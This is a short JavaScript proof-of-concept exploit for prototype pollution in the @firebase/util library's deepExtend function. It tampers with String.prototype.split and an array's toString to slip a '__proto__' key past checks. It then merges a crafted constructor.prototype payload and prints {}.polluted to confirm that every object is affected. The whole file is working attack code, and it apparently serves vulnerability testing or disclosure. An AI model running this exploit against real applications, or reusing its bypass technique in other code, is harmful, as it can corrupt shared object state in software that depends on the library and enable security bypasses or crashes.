var arg = ['__proto__'];
var flag1 = true;
arg.toString = function () {
    if (flag1) {
        flag1 = false;
        return 'foo';
    } else {
        return '__proto__';
    }
};
String.prototype.split = function () {
    return [
        arg,
        'polluted'
    ];
};
console.log({}.polluted);
const util = require('@firebase/util');
var payload = JSON.parse('{"constructor": {"prototype": {"polluted":"yes"}}}');
const a = {
    nest: {
        number: 1,
        string: '1',
        object: { key: '1' },
        date: new Date(1),
        nest: { a: 1 }
    }
};
var result = util.deepExtend(a, payload);
console.log({}.polluted);